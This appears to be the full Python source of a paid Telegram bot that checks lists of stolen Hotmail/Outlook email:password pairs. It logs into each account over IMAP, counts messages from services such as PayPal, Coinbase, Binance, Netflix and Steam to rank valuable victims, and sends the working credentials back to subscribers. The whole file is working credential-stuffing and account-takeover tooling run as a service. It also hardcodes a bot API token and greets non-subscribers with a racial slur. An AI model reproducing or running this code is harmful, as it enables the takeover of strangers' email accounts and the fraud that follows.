import telebot
import imaplib
import json
import email
from email.header import decode_header
from datetime import datetime, timedelta
import time
from threading import Thread

# Replace '7466681629:AAGLieCbuZ-PkHH7BKrcfkY3ctExmcEW1S4' with your actual bot API key
API_TOKEN = '7466681629:AAGLieCbuZ-PkHH7BKrcfkY3ctExmcEW1S4'
Admin = ['6652287427', '6431874600']
bot = telebot.TeleBot(API_TOKEN)
with open('hotmail.json', 'r') as file:
    data = json.load(file)
    subscribers = {subscriber['id']: subscriber['expiry_date'] for subscriber in data['subscribers']}


@bot.message_handler(commands=["start"])
def start(message):
    chat_id = str(message.chat.id)
    if chat_id not in subscribers:
        bot.reply_to(message, "𝖧𝖾𝗒 𝖭𝗂𝗀𝗀𝖺! 𝖳𝗁𝗂𝗌 𝖡𝗈𝗍 𝗂𝗌 𝗇𝗈𝗍 𝖿𝗋𝖾𝖾. 𝖠𝗌𝗄 @kiltes 𝗍𝗈 𝗀𝖾𝗍 𝖺𝖼𝖼𝖾𝗌𝗌 𝗍𝗈 𝗍𝗁𝗂𝗌 𝖡𝗈𝗍.")
        return
    
    expiry_date_str = subscribers[chat_id]
    expiry_date = datetime.strptime(expiry_date_str, '%Y-%m-%d')
    current_date = datetime.now()
    
    if current_date > expiry_date:
        bot.reply_to(message, "Sorry, your premium subscription has expired.")
    else:
        bot.reply_to(message, f"𝖣𝗋𝗈𝗉 𝖠 𝖢𝗈𝗆𝖻𝗈 𝖧𝖾𝗋𝖾 𝖠𝗇𝖽 𝖫𝖾𝗍 𝖬𝖾 𝖣𝗈 𝖬𝖺𝗀𝗂𝖼 🪄")
def check_login(email, password):
    try:
        mail = imaplib.IMAP4_SSL('imap-mail.outlook.com')
        mail.login(email, password)
        mail.logout()
        return True
    except imaplib.IMAP4.error:
        return False

def check_inbox_count(email_address, password):
    try:
        # Connect to the Hotmail IMAP server
        mail = imaplib.IMAP4_SSL("imap-mail.outlook.com")
        mail.login(email_address, password)
        mail.select("inbox")

        # Define the list of senders to search for
        senders = {
            "Instagram": "security@mail.instagram.com",
            "Netflix": "info@account.netflix.com",
            "Spotify": "no-reply@spotify.com",
            "PayPal": "service@paypal.com",
            "Amazon": "account-update@amazon.com",
            "Steam": "noreply@steampowered.com",
            "Facebook": "security@facebookmail.com",
            "Coinbase": "no-reply@coinbase.com",
            "Binance": "do_not_reply@mgdirectmail.binance.com",
            "Supercell": "noreply@id.supercell.com",            "Rockstar": "noreply@rockstargames.com"
        }

        counts = {}

        for service, sender in senders.items():
            status, messages = mail.search(None, f'FROM "{sender}"')
            if status == "OK":
                email_ids = messages[0].split()
                counts[service] = len(email_ids)
            else:
                counts[service] = 0

        # Logout from the server
        mail.logout()

        return counts

    except Exception as e:
        return str(e)

def process_document(chat_id, file_content):
    start_time = time.time()

    total_lines = len(file_content)
    successful_logins = []
    failed_logins = 0

    for i, line in enumerate(file_content):
        try:
            email, password = line.split(':')
            if check_login(email, password):
                # Check inbox counts
                result = check_inbox_count(email, password)
                if isinstance(result, dict):
                    response = ""
                    for service, count in result.items():
                        response += f"{service}: {count} emails\n"    
            
                    bot.send_message(chat_id, f"「 𝗛ᴏᴛᴍᴀɪʟ 𝗛ɪᴛ 」\n➭ {email}:{password}\n━━━━━━━━[𝗜𝗡𝗕𝗢𝗫 📥]━━━━━━━━\n{response}\n━━━━━━━━━━━━━━━━━━━━━━━\nʙᴏᴛ ʙʏ: @newlester")
                else:
                    bot.send_message(chat_id, f"⎇ Hᴏᴛᴍᴀɪʟ Hɪᴛ ⊹\n␥ 𝐒𝐭𝐚𝐭𝐮𝐬 » 𝐋𝐨𝐠𝐠𝐞𝐝 𝐈𝐧 ✓\n⚿ 𝐂𝐫𝐞𝐝𝐞𝐧𝐭𝐢𝐚𝐥𝐬 » {email}:{password}\n⎆ 𝐁𝐨𝐭 𝐁𝐲 : @newlester\nError: {result}")
                successful_logins.append(email)
            else:
                failed_logins += 1
        except ValueError:
            failed_logins += 1

        if i % 50 == 0:  # Update every 50 lines
            current_time = time.time()
            time_taken = current_time - start_time
            result_message = f"𓄵 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀...\n\n➱ Total Lines = {total_lines}\n➱ Processed = {i+1}\n➱ Threading = 50\n➱ Hits = {len(successful_logins)}\n➱ Failed = {failed_logins}\n➱ Time Taken = {time_taken:.2f}s"
            bot.edit_message_text(result_message, chat_id, checking_message.message_id)

    end_time = time.time()
    time_taken = end_time - start_time


    final_result_message = f"𝙍𝙚𝙨𝙪𝙡𝙩𝙨 𝘾𝙖𝙥𝙩𝙪𝙧𝙚𝙙 🐾\n➱ 𝖳𝗈𝗍𝖺𝗅 𝖫𝗂𝗇𝖾𝗌 = {total_lines}\n➱ 𝖧𝗂𝗍𝗌 = {len(successful_logins)}\n➱ 𝖥𝗎𝖼𝗄𝖾𝖽 = {failed_logins}\n➱ 𝖳𝗂𝗆𝖾 𝖳𝖺𝗄𝖾𝗇 = {time_taken:.2f}s\n\nᗷᗝ丅 ᗷƳ: @newlester"
    bot.edit_message_text(final_result_message, chat_id, checking_message.message_id)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if str(message.chat.id) not in subscribers:
        return
    global checking_message
    checking_message = bot.reply_to(message, "⛗ 𝙋𝙚𝙣𝙙𝙞𝙣𝙜...\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝗐𝖺𝗂𝗍 𝗂𝗍 𝗆𝖺𝗒 𝗍𝖺𝗄𝖾 𝗍𝗂𝗆𝖾. 𝖨 𝗐𝗂𝗅𝗅 𝗂𝗇𝖿𝗈𝗋𝗆 𝗒𝗈𝗎 𝗐𝗁𝖾𝗇 𝖼𝗈𝗆𝗉𝗅𝖾𝗍𝖾𝖽 |")

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    file_content = downloaded_file.decode('utf-8').strip().split('\n')

    thread = Thread(target=process_document, args=(message.chat.id, file_content))
    thread.start()

@bot.message_handler(commands=['chk'])
def check_inbox(message):
    try:
        # Extract email and password from the message
        email_password = message.text.split()[1]
        email_address, password = email_password.split(':')

        # Check inbox counts
        result = check_inbox_count(email_address, password)

        if isinstance(result, dict):
            response = ""
            for service, count in result.items():
                response += f"{service}: {count} emails\n"
            bot.reply_to(message, response)
        else:
            bot.reply_to(message, f"Error: {result}")

    except IndexError:
        bot.reply_to(message, "Usage: /chk email:password")
    except ValueError:
        bot.reply_to(message, "Invalid format. Use /chk email:password")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def load_data():
    with open('hotmail.json', 'r') as file:
        return json.load(file)

def save_data(data):
    with open('hotmail.json', 'w') as file:
        json.dump(data, file, indent=4)

Admins = ['6652287427', '987654321'] 

@bot.message_handler(commands=['subscribers'])
def send_subscribers(message):
    if str(message.chat.id) not in Admins:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    data = load_data()
    response = ""
    for subscriber in data['subscribers']:
        response += f"ID: {subscriber['id']} - Expiry Date: {subscriber['expiry_date']}\n"

    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['kick'])
def kick_subscriber(message):
    if str(message.chat.id) not in Admins:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.send_message(message.chat.id, "Please provide a subscriber ID to kick.")
        return

    subscriber_id_to_kick = args[1]
    data = load_data()
    original_subscriber_count = len(data['subscribers'])
    data['subscribers'] = [sub for sub in data['subscribers'] if sub['id'] != subscriber_id_to_kick]

    if len(data['subscribers']) == original_subscriber_count:
        bot.send_message(message.chat.id, "Subscriber ID not found.")
    else:
        save_data(data)
        bot.send_message(message.chat.id, f"Subscriber {subscriber_id_to_kick} has been removed.")
@bot.message_handler(commands=['allow'])
def allow_subscriber(message):
    if str(message.chat.id) not in Admins:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 3:
        bot.send_message(message.chat.id, "Please provide a subscriber ID and number of days.")
        return

    new_id, days = args[1], int(args[2])
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    data = load_data()
    data['subscribers'].append({'id': new_id, 'expiry_date': expiry_date})
    save_data(data)
    bot.send_message(message.chat.id, f"Subscriber {new_id} added with expiry on {expiry_date}.")

bot.infinity_polling()
